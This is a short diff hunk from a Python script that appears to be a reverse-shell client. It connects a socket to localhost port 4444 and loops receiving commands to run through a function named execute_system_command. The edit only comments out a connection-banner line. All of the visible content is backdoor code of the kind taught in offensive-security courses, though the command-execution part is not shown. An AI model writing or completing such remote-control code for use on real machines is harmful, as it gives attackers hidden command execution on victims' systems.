@@ -11,7 +11,7 @@ def execute_system_command(command):
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection.connect(("localhost", 4444))
 
-connection.send("\n [+] Connection established. \n")
+# connection.send("\n [+] Connection established. \n")
 
 while True:
     command = connection.recv(1024)
